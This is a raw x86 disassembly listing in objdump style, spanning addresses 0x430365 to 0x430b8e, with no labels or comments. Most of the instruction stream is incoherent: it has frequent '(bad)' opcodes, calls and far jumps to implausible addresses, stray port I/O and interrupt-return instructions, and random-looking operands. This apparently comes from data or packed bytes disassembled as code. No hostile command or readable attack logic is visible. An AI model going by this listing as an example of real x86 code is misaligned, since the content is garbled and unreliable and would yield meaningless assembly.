  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
